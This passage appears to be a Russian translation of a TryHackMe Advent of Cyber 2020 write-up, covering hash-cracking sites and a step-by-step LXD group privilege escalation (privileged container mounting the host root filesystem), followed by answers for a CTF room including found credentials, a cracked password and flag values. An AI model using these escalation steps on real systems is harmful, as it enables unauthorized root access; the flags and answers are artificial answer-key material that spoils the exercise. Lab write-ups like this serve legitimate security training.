множество веб-сайтов с единственной целью — разместить радужные таблицы — таблицы ранее взломанных паролей. Это 
позволяет нам чаще всего просто ввести хэш пароля и почти мгновенно получить взломанный пароль. Вот некоторые из 
различных сайтов, которые я (Dark) часто использую, особенно в случае CTF:   
-  https://crackstation.net/ 
-  https://md5decrypt.net/en/ 
-  https://hashes.com/en/decrypt/hash 

Целевая страница crackstation.net

Повышение привилегий с помощью LXD :

Среди наиболее любопытных методов повышения привилегий в Linux lxd, безусловно, является, мягко говоря, загадкой. 
Эта техника включает в себя использование уязвимости в lxd, программе, которую мы можем использовать для запуска 
контейнеров, очень похожих на Docker. Этот эксплойт, в частности, включает в себя злоупотребление точками 
монтирования для монтирования томов с нашей машины-жертвы (машины, которую мы атакуем) в контейнере, к которому мы 
не должны иметь доступа/чтения. Однако у нас есть полномочия root на контейнерах lxd, что позволяет нам обходить 
проверки разрешений на чтение и повышать наши привилегии. Мы можем выполнить этот метод privesc, выполнив следующие 
шаги:      
1. Сначала нам нужно проверить, является ли наш пользователь членом группы lxd. Мы можем сделать это с помощью команды: id
В этом случае мы видим, что пользователь является членом группы lxd. Обратите внимание, что изображения из этого 
   раздела взяты из источника, ссылка на который приведена в конце в отношении дополнительной информации.  
2. Обычно этот privesc может быть немного затянутым процессом, однако в нашем случае мы сможем пропустить часть пути.
   Чтобы выполнить его правильно, нам нужно выполнить следующие шаги.: 
- Действия, которые необходимо выполнить на атакующей машине:
- - Загрузите build-alpine на локальную машину через  репозиторий git
- - Выполните скрипт "build -alpine", который создаст последний образ Alpine в виде сжатого файла. Это должно быть 
    выполнено пользователем root. 
- - Перенесите этот недавно созданный файл tar на машину-жертву.
- Действия, которые необходимо выполнить на зараженном компьютере:
- - Загрузить альпийское изображение
- - Импорт изображения для lxd
- - Инициализируйте образ внутри нового контейнера  <- Стоит проверить уже импортированные/доступные образы, так как 
    вы можете пропустить этот шаг 
- - Смонтируйте контейнер в каталог /root
3. Ради этого примера мы перейдем к концу (см. выделенный жирным шрифтом фрагмент выше), проверив, какие образы 
   доступны на рассматриваемой машине. Мы можем сделать это с помощью следующей команды: lxc image list 
Проверка доступных образов с помощью команды: lxc image list
4. Теперь самое интересное. Далее мы запустим ряд команд, которые инициализируют, настроят диски и запустят 
   контейнер. Имя образа должно совпадать с именем импортированного образа, который мы будем использовать. В случае 
   с образом выше это будет псевдоним myimage, ранее назначенный ему. Имя контейнера и имя устройства — все, что 
   душе угодно. В моем примере я называю свой контейнер strongbad, а устройство trogdor.   
`lxc init IMAGENAME CONTAINERNAME -c security.privileged=true`

Пример: `lxc init myimage strongbad -c security.privileged=true`

`lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true`

Пример: `lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true`

`lxc start CONTAINERNAME`

Пример: `lxc start strongbad`

'lxc exec CONTAINERNAME /bin/sh'

Пример: 'lxc exec strongbad /bin/sh'

Затем мы выполним еще несколько команд, чтобы смонтировать наше хранилище и убедиться, что мы получили права root:
```commandline
id
cd /mnt/root/root
```
Вот и все! Если это было для вас немного сложно, я настоятельно рекомендую вам ознакомиться с ресурсом, 
представленным ниже.  

Дополнительную информацию об этой технике privesc можно найти здесь: Ссылка

Авторы : Эта комната была создана в сотрудничестве с Dark , Muiri , Varg и Spooky.

Помните, что полная загрузка компьютера может занять до пяти минут!

### Ответить на вопросы ниже
Просканируйте машину. Какие порты открыты?
```commandline
80, 65000
```
Как называется скрытый веб-сайт?  Стоит рекурсивно просмотреть все веб-сайты на коробке для этого шага. 
```commandline
Light Cycle
```
Как называется скрытая php-страница?
```commandline
uploads.php
```
Как называется скрытый каталог, в котором сохраняются загруженные файлы?


```commandline
grid
```
Обойти фильтры. Загрузить и выполнить обратный шелл. 
```commandline
Ответ не нужен
```
Каково значение флага web.txt?
```commandline
THM{ENTER_THE_GRID}
```
Обновите и стабилизируйте свой панцирь. 
```commandline
Ответ не нужен
```
Просмотрите файлы конфигурации веб-сервера, чтобы найти полезную добычу в виде учетных данных. Какие учетные данные 
вы нашли? имя пользователя:пароль 
```commandline
tron:IFightForTheUsers
```
Получите доступ к базе данных и найдите зашифрованные учетные данные. Как называется база данных, в которой вы их нашли?
```commandline
tron
```
Взломать пароль. Что это?
```commandline
@computer@
```
Используйте su для входа в систему под вновь обнаруженным пользователем, используя повторное использование пароля. 
```commandline
Ответ не нужен
```
Каково значение флага user.txt?
```commandline
THM{IDENTITY_DISC_RECOGNISED}
```
Проверьте группы пользователя. Какую группу можно использовать для повышения привилегий? 
```commandline
lxd
```
Используйте эту группу для повышения привилегий до уровня root.
```commandline
Ответ не нужен
```
Каково значение флага root.txt?

```commandline
THM{FLYNN_LIVES}
```

## Задание 30
[Спасибо]
Большое спасибо за участие в мероприятии Advent of Cyber в этом году!

### Ответить на вопросы ниже
Помогите нам стать лучше, ответив на этот 5-минутный опрос!  https://forms.gle/iixyNWzyZupumsPN7 
```commandline
thm{thank_you_2020}
```
Продолжайте обучение по программам «Полный новичок» ,  «Атакующее пентестирование»  или «Защитная безопасность» !
```commandline
Ответ не нужен
```
Победители будут объявлены 26 декабря - до этого времени у вас есть время выполнить задания. Помните, чем больше 
вопросов вы ответите, тем выше ваши шансы на победу! 
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)